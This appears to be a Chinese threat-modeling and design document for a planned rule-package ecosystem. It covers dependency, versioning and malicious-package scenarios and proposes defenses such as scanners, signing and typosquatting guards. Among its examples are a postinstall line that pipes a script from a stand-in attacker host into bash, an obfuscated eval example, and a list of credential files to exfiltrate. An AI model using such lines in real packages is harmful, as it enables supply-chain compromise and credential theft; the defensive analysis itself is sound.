# 💥 混沌工程攻击向量 #5：规则包生态系统

> **归档分组：C 组 — 未来架构预研**
> 本文为未来架构预研，不代表当前 MVP 设计基线。规则包生态系统是 P3 远期能力，当前 MVP 从单一 Git 仓库安装配置，不涉及包管理、搜索推荐等生态平台能力。

规则包生态是 aiforge 的"应用商店"，类似于 npm、pip、cargo 等包管理器的生态。这个系统涉及：

1. 依赖解析：规则包之间的依赖关系
2. 版本管理：语义化版本、兼容性
3. 恶意包检测：安全审查、信任机制
4. 包发现：搜索、推荐、评分
5. 社区生态：贡献、维护、废弃

从攻击者角度思考：如果我想破坏这个生态系统，我会：
- 创建循环依赖让安装失败
- 发布恶意包窃取数据
- 抢注流行包名进行钓鱼
- 发布不兼容版本破坏现有项目
- 废弃关键包导致生态崩溃

这是一个高风险领域，因为涉及到用户信任和安全。

## 攻击前的生态系统梳理

```
规则包生态的核心流程:

用户视角:
  1. 发现包（搜索、推荐）
  2. 评估包（评分、文档、示例）
  3. 安装包（下载、依赖解析）
  4. 使用包（应用规则）
  5. 更新包（版本升级）
  6. 卸载包（清理）

维护者视角:
  1. 创建包（定义规则、编写文档）
  2. 发布包（上传到仓库）
  3. 维护包（修复 bug、添加功能）
  4. 废弃包（标记为过时）

平台视角:
  1. 托管包（存储、分发）
  2. 审查包（安全检查）
  3. 索引包（搜索、推荐）
  4. 监控包（使用统计、问题追踪）


当前 MVP 基线:
  - 知识仓库 = 单一 Git 仓库（GitLab/GitHub）
  - aiforge.json = 仓库配置清单（可选）
  - 没有中心化的包注册表
  - 用户直接从 Git 仓库安装
  - 不涉及依赖解析、版本管理、搜索推荐

目标架构（P3 远期）:
  - 知识仓库演进为规则包（manifest.json = 包元数据）
  - 引入中心化或联邦式包注册表
  - 支持依赖解析、版本管理、安全扫描
  - 支持搜索、评分、推荐
  - 支持包发布流水线和社区治理

以下攻击场景均基于目标架构（P3）进行分析。
```

## 💥 攻击场景 5.1：依赖解析的复杂性和失败

依赖解析是包管理器最复杂的部分。npm、pip 等都有大量的依赖解析 bug。主要问题：
1. 循环依赖
2. 版本冲突
3. 依赖地狱（dependency hell）
4. 幽灵依赖（phantom dependencies）
5. 传递依赖的版本约束

```
场景 A — 循环依赖
────────────────
  包 A 依赖 包 B
  包 B 依赖 包 C
  包 C 依赖 包 A
  用户安装包 A:
    → 需要 B
    → 需要 C
    → 需要 A（已经在安装中）
    → 无限循环

  问题:
    如果没有循环检测 → 栈溢出
    如果有循环检测 → 如何处理？
      - 报错？（用户无法使用）
      - 忽略？（可能缺少功能）
      - 警告？（用户困惑）


场景 B — 菱形依赖冲突
────────────────────

  包 A 依赖 包 C v1.0
  包 B 依赖 包 C v2.0
  用户同时需要 A 和 B

  问题:
    C v1.0 和 v2.0 不兼容
    → 无法同时满足

  可能的解决方案:
    1. 报错（用户无法使用）
    2. 选择一个版本（可能破坏另一个包）
    3. 安装两个版本（如何隔离？）
    4. 让用户选择（用户可能不懂）


场景 C — 版本约束冲突
────────────────────

  包 A: "dependencies": { "C": "^1.0.0" }
  包 B: "dependencies": { "C": "~1.5.0" }

  C 的可用版本: 1.0.0, 1.5.0, 1.6.0, 2.0.0

  问题:
    ^1.0.0 = 1.x.x（1.0.0 - 1.9.9）
    ~1.5.0 = 1.5.x（1.5.0 - 1.5.9）
    交集 = 1.5.x
  如果没有 1.5.x 版本:
    → 无解

  如果有多个 1.5.x 版本:
    → 选择哪个？（最新？最稳定？）


场景 D — 传递依赖的版本提升
──────────────────────────

  包 A 依赖 包 C v1.0
  包 B 依赖 包 C v1.5
  包 C v1.5 有安全漏洞

  用户安装 A 和 B:
    → 系统选择 C v1.5（满足两者）
    → 但 A 可能在 v1.5 上有 bug

  问题:
    传递依赖的版本被"提升"
    → 可能破坏依赖它的包


场景 E — 可选依赖的处理
──────────────────────

  包 A:
    "dependencies": { "B": "^1.0.0" }
    "optionalDependencies": { "C": "^2.0.0" }

  如果 C 安装失败:
    → A 应该继续安装（C 是可选的）
    → 但 A 的某些功能可能不可用

  问题:
    用户不知道哪些功能不可用
    → 运行时才发现错误


场景 F — 开发依赖 vs 生产依赖
────────────────────────────

  包 A:
    "dependencies": { "B": "^1.0.0" }
    "devDependencies": { "test-framework": "^3.0.0" }

  用户安装 A:
    → 应该安装 devDependencies 吗？

  问题:
    如果安装 → 浪费空间和时间
    如果不安装 → 用户无法运行测试


场景 G — 幽灵依赖
────────────────

  包 A 依赖 包 B
  包 B 依赖 包 C

  包 A 的代码中直接使用了 C（但没有声明依赖）

  问题:
    在当前环境可以工作（C 被 B 安装了）
    如果 B 移除了对 C 的依赖 → A 崩溃
    → 隐式依赖，难以发现


场景 H — 依赖解析的性能问题
──────────────────────────

  包 A 有 100 个依赖
  每个依赖又有 10 个依赖
  总共 1000+ 个包需要解析

  问题:
    版本约束求解是 NP 完全问题
    → 可能需要很长时间
    → 或者找不到解


场景 I — 依赖的平台特定性
────────────────────────

  包 A 在 Windows 上依赖 包 B
  包 A 在 Linux 上依赖 包 C

  manifest.json:
    "dependencies": {
      "B": "^1.0.0",  // Windows only
      "C": "^1.0.0"   // Linux only
    }

  问题:
    如何表达平台特定依赖？
    如果不支持 → 所有平台都安装所有依赖


场景 J — 依赖的条件性
────────────────────

  包 A 在启用某个功能时依赖 包 B
  manifest.json:
    "dependencies": {
      "B": "^1.0.0"  // 只在 feature-x 启用时需要
    }

  问题:
    如何表达条件依赖？
    如果不支持 → 总是安装（浪费）
```

### 加固方案

**核心类：DependencyResolver（依赖解析器，简化版 SAT Solver）**

核心功能：
- 解析包依赖树，检测循环依赖，处理版本冲突
- 深度限制 100 层防止无限递归
- 使用 Set 追踪正在解析的包以检测循环

主要方法：
1. `resolve(rootPackages)` - 解析根包依赖，验证结果，生成安装计划
2. `resolvePackage(name, constraint, depth)` - 递归解析单个包
   - 循环检测：检查 resolving Set
   - 版本冲突检测：检查已解析版本是否满足新约束
   - 可选依赖失败不阻塞（try-catch 隔离）
3. `selectVersion(versions, constraint)` - 选择满足约束的最新稳定版本，无稳定版时选最新预发布版
4. `satisfiesConstraint(version, constraint)` - 版本约束检查
   - 支持 `^`（主版本兼容）、`~`（次版本兼容）、`>=`（最小版本）、`*`/`latest`、精确匹配
5. `validateResolution()` - 验证所有依赖均已解析
6. `generateInstallPlan()` - 拓扑排序生成安装顺序

**核心类：ConflictResolver（依赖冲突解决器）**

菱形依赖冲突解决策略：
- `latest-compatible`：查找版本交集，选择最新兼容版本
- `multiple-versions`：安装多个版本并隔离
- `ask-user`：交互式让用户选择

**核心类：PlatformDependencies（平台特定依赖支持）**

通过 `manifest.platformDependencies` 字段过滤不适用当前平台的依赖。

关键伪代码：
```
function resolvePackage(name, constraint, depth):
    if depth > 100: throw "深度超限"
    if name in resolving: throw "循环依赖"
    if name in resolved:
        if not satisfies(resolved[name], constraint):
            throw "版本冲突"
        return resolved[name]

    resolving.add(name)
    version = selectVersion(fetchPackage(name), constraint)
    resolved[name] = version

    for dep in version.dependencies:
        resolvePackage(dep.name, dep.constraint, depth+1)

    resolving.remove(name)
```

## 💥 攻击场景 5.2：版本管理的混乱

版本管理是生态系统的基础。如果版本管理混乱，整个生态都会崩溃。主要问题：
1. 语义化版本的违反
2. 破坏性变更没有标记
3. 版本回退和撤回
4. 预发布版本的处理
5. 版本锁定和更新策略

```
场景 A — 语义化版本违反
──────────────────────
  包 A v1.5.0 → v1.5.1（补丁版本）
  但实际上包含了破坏性变更

  用户项目:"dependencies": { "A": "^1.5.0" }
    → 自动更新到 v1.5.1
    → 项目崩溃
  问题:
    用户信任语义化版本
    维护者违反了约定
    → 信任破裂


场景 B — 破坏性变更没有标记
──────────────────────────

  包 A v1.9.9 → v2.0.0
  CHANGELOG 没有说明破坏性变更

  用户升级:
    → 不知道需要修改代码
    → 运行时才发现错误

  问题:缺少迁移指南
    用户不知道如何升级


场景 C — 版本撤回和回退
──────────────────────

  包 A v2.0.0 发布后发现严重 bug
  维护者撤回 v2.0.0

  已经安装 v2.0.0 的用户:
    → 不知道版本被撤回
    → 继续使用有 bug 的版本

  问题:
    如何通知用户？
    如何强制降级？


场景 D — 预发布版本的混乱
────────────────────────

  包 A 的版本:
    1.0.0, 1.1.0-alpha, 1.1.0-beta, 1.1.0-rc1, 1.1.0

  用户: "dependencies": { "A": "^1.0.0" }

  问题:
    ^1.0.0 应该匹配预发布版本吗？
    如果匹配 → 用户可能安装不稳定版本
    如果不匹配 → 用户无法测试新功能


场景 E — 版本锁定的困境
──────────────────────

  项目使用 lockfile（类似 package-lock.json）
  锁定了所有依赖的精确版本

  优点: 可重现构建
  缺点: 无法自动获取安全更新

  场景:
    包 A v1.5.0 有安全漏洞
    修复在 v1.5.1
    但 lockfile 锁定了 v1.5.0
    → 用户不知道有安全漏洞


场景 F — 版本范围的歧义
──────────────────────

  不同的包管理器对版本范围的理解不同:
  npm: ^1.2.3 = >=1.2.3 <2.0.0
  pip: ~=1.2.3 = >=1.2.3 <1.3.0
  cargo: 1.2.3 = ^1.2.3

  如果 aiforge 使用不同的规则:→ 用户困惑
    → 迁移困难


场景 G — 版本号耗尽
──────────────────

  包 A 已经到了 v999.0.0
  下一个版本应该是什么？

  问题:
    语义化版本没有上限
    但实际系统可能有限制


场景 H — 日期版本 vs 语义版本
────────────────────────────

  有些包使用日期版本: 2024.01.15
  有些包使用语义版本: 1.2.3

  问题:
    如何比较？
    如何表达依赖？


场景 I — 版本别名
────────────────

  包 A:
    v1.0.0 (stable)
    v2.0.0-beta (latest)

  用户: "dependencies": { "A": "latest" }

  问题:
    "latest" 应该是 stable 还是 beta？
    不同用户可能有不同期望
```

### 加固方案

**核心类：SemanticVersionManager（语义化版本管理器）**

功能：版本解析、比较、约束验证、破坏性变更检测

- `parse(versionString)` — 解析 `major.minor.patch[-prerelease][+build]` 格式
- `compare(v1, v2)` — 按 major → minor → patch → prerelease 逐级比较
- `satisfies(version, constraint)` — 支持 `^`、`~`、`>=`、`<=`、`>`、`<`、`*`/`latest`、精确匹配
- `isBreakingChange(from, to)` — 主版本号变化 = 破坏性变更
- `isPrerelease(version)` — 检测预发布版本
- `bump(version, type)` — 生成下一个 major/minor/patch 版本号

**核心类：VersionDeprecation（版本撤回和废弃管理）**

- `deprecate(pkg, version, reason)` — 标记废弃，可指定替代方案
- `yank(pkg, version, reason)` — 撤回版本（严重问题），已撤回版本安装时抛出异常
- `checkVersion(pkg, version)` — 安装前检查：已撤回 → 阻止；已废弃 → 警告

**核心类：Lockfile（版本锁定文件）**

- `lock(packageName, version, integrity)` — 锁定版本 + SHA-256 完整性哈希
- `verify()` — 校验所有锁定版本的完整性
- `checkSecurity()` — 扫描锁定版本是否有已知安全漏洞

**核心类：UpdateStrategy（版本更新策略）**

4 种策略：
- `conservative`：只更新 patch 版本
- `moderate`：更新 minor + patch
- `aggressive`：更新所有（含 major）
- `security-only`：只更新有安全修复的版本

## 💥 攻击场景 5.3：恶意包和安全威胁

这是最危险的攻击向量。恶意包可以：
1. 窃取敏感数据（密钥、Token）
2. 植入后门
3. 挖矿
4. 破坏系统
5. 钓鱼攻击

npm 生态已经有多次恶意包事件，我们必须从中吸取教训。

```
场景 A — 名称抢注（Typosquatting）
────────────────────────────────
  流行包: "ai-prompts"
  恶意包: "ai-prompt"（少一个 s）

  用户打错字:
    aiforge install ai-prompt
    → 安装了恶意包
    → 窃取 API 密钥

  问题:
    用户很难发现拼写错误
    恶意包可能有相似的描述


场景 B — 依赖混淆攻击
────────────────────

  公司内部包: "internal-prompts"（私有仓库）
  恶意包: "internal-prompts"（公开仓库）

  如果公开仓库优先级更高:
    → 安装了恶意包而不是内部包
    → 窃取公司数据

  问题:
    包名冲突
    优先级不明确


场景 C — 供应链攻击
──────────────────

  流行包 A 被黑客接管
  黑客发布 A v2.0.0（包含恶意代码）

  所有依赖 A 的项目:
    → 自动更新到 v2.0.0
    → 被植入后门

  问题:
    信任链被破坏
    影响范围巨大


场景 D — 安装脚本攻击
────────────────────

  包 A 的 manifest.json:
    "postinstall": "curl evil.com/malware.sh | bash"

  用户安装包 A:
    → 自动执行恶意脚本
    → 窃取数据或植入后门

  问题:
    安装脚本有完整的系统权限
    用户可能不知道脚本在做什么


场景 E — 代码混淆
────────────────恶意包使用高度混淆的代码:
    eval(atob("ZXZpbCBjb2Rl..."))

  问题:
    难以审查
    静态分析工具可能无法检测


场景 F — 延迟激活
────────────────

  恶意包在安装后不立即执行
  而是等待特定条件:
    - 特定日期（定时炸弹）
    - 特定环境变量
    - 特定文件存在

  问题:
    初期测试无法发现
    大规模部署后才爆发


场景 G — 数据泄露
────────────────

  恶意包读取敏感文件:
    ~/.ssh/id_rsa
    ~/.aws/credentials
    .env 文件

  然后发送到远程服务器

  问题:
    用户可能不知道数据被窃取
    直到账户被盗用


场景 H — 包劫持
──────────────

  维护者账户被盗黑客发布恶意版本

  或者:
    维护者出售包的所有权
    新所有者植入恶意代码

  问题:
    用户信任原维护者
    不知道所有权已变更


场景 I — 社会工程
────────────────

  恶意包伪装成有用的工具:
    "ai-prompt-optimizer"（声称优化 prompt）
    "gitlab-token-manager"（声称管理 Token）

  实际上窃取用户数据

  问题:
    用户被功能描述吸引
    没有仔细审查代码


场景 J — 零日漏洞利用
────────────────────

  恶意包利用 aiforge 本身的漏洞:
    - 路径遍历
    - 命令注入
    - 权限提升

  问题:
    即使用户谨慎，也可能被攻击
    需要及时修复漏洞
```

### 加固方案

**核心类：PackageSecurityScanner（包安全扫描器）**

多层次扫描（`scanPackage`）——7 种检测方法：
1. 恶意包列表检查（已知恶意包数据库）
2. Typosquatting 检测（Levenshtein 编辑距离 ≤2 + 常见替换攻击）
3. 安装脚本危险模式识别（eval、exec、child_process、网络请求、文件系统操作）
4. 权限请求审查（验证请求权限的合理性）
5. 网络访问检测（可疑的外部连接）
6. 文件系统操作检测（敏感路径访问：~/.ssh、~/.aws、.env）
7. 代码混淆检测（熵分析，高熵值 = 可能混淆）

风险等级：critical / high / medium / low

**核心类：PackageSignature（包签名验证）**

- `signPackage(packagePath, privateKey)` — SHA-256 哈希 + 私钥签名
- `verifyPackage(packagePath, signature, publicKey)` — 验证签名完整性
- `verifyPublisher(packageName, publisherId)` — 确认发布者身份

**核心类：PackageSandbox（沙箱执行环境）**

### 加固方案

**核心类：PackageReputationSystem（包评分和信誉系统）**

综合评分模型，按加权平均计算包的总分：

| 维度 | 权重 | 评分依据 |
|------|------|---------|
| 安全性 | 30% | 已知漏洞（-50/个）、危险 API（-20）、无签名（-10）、过多权限（-15）、混淆代码（-25） |
| 质量 | 25% | README（+20）、示例（+15）、测试（+15）、类型定义（+10）、覆盖率>80%（+20）、CI（+10）、Lint（+10） |
| 维护 | 20% | 更新时间（30天内+30）、更新频率（>12次/年+20）、Issue 响应时间（<24h+20）、活跃维护者（+15）、遵循 semver（+15） |
| 社区 | 15% | Stars（对数缩放，上限30）、真实下载量（对数缩放，上限25）、依赖者数量（上限20）、贡献者数量（上限15）、活跃讨论（+10） |
| 信任 | 10% | 基础分50，验证发布者（+30）、存在>1年（+10）、无举报（+10）、安全审计（+20）、被可信包依赖（+10）、负面报告（-30/个） |

虚假评分检测（5 种检测方法）：
1. 评分分布异常（>80% 五星）
2. 短时间内大量评论（24h 内 >50 条）
3. 新账户评论占比（>50% 为 7 天内注册账户）
4. 评论内容相似度（>0.7）
5. 单评论用户占比（>60% 的评论者只评论了这一个包）

虚假下载量检测（4 种检测方法）：
1. 下载量异常突增
2. 单 IP 下载占比（>30%）
3. 下载后使用率异常低（<10%）
4. 下载时间模式类似机器人

**核心类：PackageSearchEngine（智能搜索和推荐系统）**

搜索流程：文本搜索 → 过滤器 → 相关性计算 → 排序 → 分页

匹配分数计算：
- 包名匹配：+10/token
- 描述匹配：+3/token
- 关键词匹配：+5/token
- 关键词堆砌惩罚：>20 个关键词时分数 ×0.5

相关性综合计算：
- 匹配分数 + 信誉分数×0.3 + 下载量（对数缩放）×2 + 更新时间加分
- 可疑包降权：虚假评分/下载量检测结果按置信度降低分数

推荐相似包：基于关键词重叠（×5）、类别相同（+10）、依赖重叠（×3）计算相似度

排序支持：relevance（默认）、downloads、rating、updated

### 加固方案

**核心类：PackageLifecycleManager（包维护和生命周期管理）**

健康检查（`checkHealth`）——5 项检测：
1. 维护状态：超过 1 年未更新 → warning
2. 维护者数量：只有 1 个维护者 → info（单点故障风险）
3. 关键包风险：被 >100 个项目依赖但维护者 <2 → warning
4. 未解决 Issue：>50 个 → warning
5. 安全漏洞：存在漏洞 → critical

包废弃和认领机制：
- `deprecatePackage(name, reason, alternative)` — 标记废弃并通知所有依赖者
- `transferOwnership(name, newMaintainer)` — 验证新维护者身份后转移，记录转移历史
- `adoptPackage(name, newMaintainer)` — 认领废弃包流程：
  1. 检查包是否已废弃或 >365 天未更新
  2. 验证新维护者资质
  3. 联系原维护者（等待 30 天响应）
  4. 原维护者同意 → 转移；未响应 → 自动批准
  5. 通知社区

维护者资质检查（`checkMaintainerQualification`）：
- 账户年龄 > 6 个月
- 至少维护过 1 个包
- 无违规记录
- 身份已验证

关键包监控（`monitorCriticalPackages`）：
- 筛选条件：被 >50 个项目依赖且维护者 ≤1
- 风险评分（0-10）：更新时间（+1~3）+ 维护者数量（+2~3）+ 依赖者规模（+1~2）+ 漏洞数量（+2~4）

**核心类：PackageNamespace（包命名空间和防抢注系统）**

包名验证规则：
- 长度：2-100 字符
- 字符：小写字母、数字、点、下划线、连字符，必须以字母或数字开头
- 禁止：保留名称（aiforge、admin、root 等）、连续特殊字符

Typosquatting 检测：
- Levenshtein 编辑距离 ≤2 → 可疑
- 常见替换攻击检测：0↔o、1↔l、3↔e、5↔s、_↔-

防批量抢注：
- 单用户上限 50 个包名
- 24 小时内上限 10 个注册
- 30 天发布期限（未发布则释放名称）

组织命名空间：`@scope/package` 模式，命名空间下的包名只有组织成员可发布

**核心类：DependencyConfusionGuard（依赖混淆防护）**

包来源解析优先级：
1. 明确指定的来源（`config.packageSources[name]`）
2. 命名空间映射（`@scope` → 内部注册表）
3. 内外注册表冲突检测 → 内部优先 + 警告

### 加固方案

**核心类：RuleInteroperabilityManager（规则包互操作性管理器）**

加载与验证流程（`loadAndValidate`）：
1. 加载所有规则包
2. 检测规则冲突（按目标文件分组，检查互斥动作）
3. 解决冲突（优先级策略 / 用户覆盖 / 安全优先）
4. 计算执行顺序

冲突检测（`detectConflicts`）：
- 按目标文件分组所有规则
- 同一目标文件有多个规则时，检查动作是否互斥（如 ignore vs symlink）
- 输出冲突详情：哪些包、哪些规则、针对哪个目标文件

冲突解决策略：
- `priority`：按包优先级选择（后安装的覆盖先安装的）
- `user-override`：查询用户配置中的覆盖规则
- `security-first`：安全相关规则优先（如 ignore 优先于 symlink）

执行顺序计算（`calculateExecutionOrder`）：
- 6 个执行阶段：validate → prepare → copy/symlink → transform → configure → cleanup
- 同阶段内按优先级排序
- 跨阶段按拓扑排序确保依赖顺序正确

**核心类：RulePackageStandard（规则包标准和验证）**

manifest JSON Schema 验证：
- 必需字段：name、version、description、rules
- 版本格式：semver
- 关键词限制：最多 20 个
- 规则定义验证：每条规则必须有 target、action、source

包结构验证：
- 必需文件：manifest.json、README.md
- 推荐文件：CHANGELOG.md、LICENSE
- 文件大小限制：单文件 10MB
- 敏感文件检测：.env、credentials、private key 等
- 路径安全检查：禁止 `..` 路径遍历

**核心类：PublishPipeline（规则包发布流水线）**

8 步发布流程：
1. 结构验证（必需文件是否存在）
2. manifest 验证（JSON Schema 校验）
3. 安全扫描（敏感文件、危险模式）
4. 重复检查（是否已存在同名同版本）
5. Typosquatting 检查（与已有包名相似度）
6. 构建（创建 tarball）
7. 签名（包完整性签名）
8. 发布（上传到注册表）

每步支持 error / warning / fatal 三级错误分类，支持 dry-run 模式。
